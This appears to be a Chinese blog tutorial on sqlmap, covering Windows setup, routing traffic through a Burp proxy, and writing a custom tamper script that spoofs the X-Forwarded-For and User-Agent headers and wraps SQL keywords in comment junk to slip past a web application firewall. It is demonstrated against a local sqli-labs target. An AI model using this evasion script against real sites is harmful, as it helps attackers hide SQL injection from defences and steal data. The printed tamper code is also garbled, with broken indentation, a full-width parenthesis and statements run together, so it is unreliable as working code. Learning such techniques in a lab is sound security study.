最近在一次项目中使用到了sqlmap，在过程中对于sqlmap是如何建立sql-shell的流量进行了抓取分析，并且学习了一个简单的绕狗方法，通过在sqlmap中自定义一个脚本，来替换我们带有特征的注入语句，达到绕狗的效果。

windows安装sqlmap

sqlmap在github上有windows的版本，下载下来就直接可以用，不过需要python2的环境

git clone https://github.com/sqlmapproject/sqlmap.git

需要注意的是，与kali中不同，在windows中运行时进入sqlmap的安装目录使用命令才可以运行

python2 sqlmap.py

sqlmap配置代理

因为需要对sqlmap的流量进行分析，而使用wireshark进行抓包，但是wireshark是在网卡处抓取流量，所以很难看清我们的攻击过程，这个时候就需要我们配置代理，使用burp来查看http流量的过程了。

sqlmap配置brup代理

python2 sqlmap.py -u xxx.xxx --proxy http://127.0.0.1:8080

在我们的语句后加上--proxy http://127.0.0.1:8080 就可以使用我们的burp来获取sqlmap的数据包了。

sqlmap脚本编写

在sqlmap的目录下，我们可以看到一个名字为tamper的文件，这个文件中，就是我们sqlmap自带的脚本，我们也可以在其中创建自己的脚本，然后去针对不同的网站进行不同的绕过策略。我们通过对脚本的编写，可以修改sqlmap在攻击时所使用的payload或修改Header的值来进行更有针对性的攻击。

脚本结构

#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
    pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    return payload

其实主要的就是tamper函数，我们修改header与payload的代码都是在这个函数中完成的。

首先看这个函数中的第一个参数，payload，这个就是我们注入所使用的payload。比如在一个sql语法为select ** from user where username=“root “or 1=1 –+”;这个简单的sql判断语句中我们的payload就为root “or 1=1 –+”  

而第二个参数，kwargs其中存有一些header的值，我们可以通过这个参数对这些值进行修改。这个参数是一个字典，其中的内容有非常多。

下面是个

"""

def dependencies():
    pass

def tamper(payload, **kwargs):
    kwargs['headers']['X-Forwarded-For'] = '10.10.10.10' 
    kwargs['headers']['User-Agent']="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    if payload:
        bystr="/*x^x*/"
    payload=payload.replace("SELECT",bystr+"SELECT"+bystr)
        payload = payload.replace(" ",'/**/')               payload=payload.replace("UNION",bystr+"UNION"+bystr)
        payload=payload.replace("AND",bystr+"AND"+bystr) 
        payload=payload.replace("=",bystr+"="+bystr) 
    payload=payload.replace("FROM",bystr+"FROM"+bystr）                      
    return payload

可以看到在上面的脚本中，我们将UA头与XFF头进行了替换，而在下面的语句中，对payload中容易被识别的关键字加上了干扰字符，来达到混淆的效果。

我们使用这个脚本进行抓包试试看效果。

python2 sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=1 --tamper "test.py" --dbs --proxy http://127.0.0.1:8080
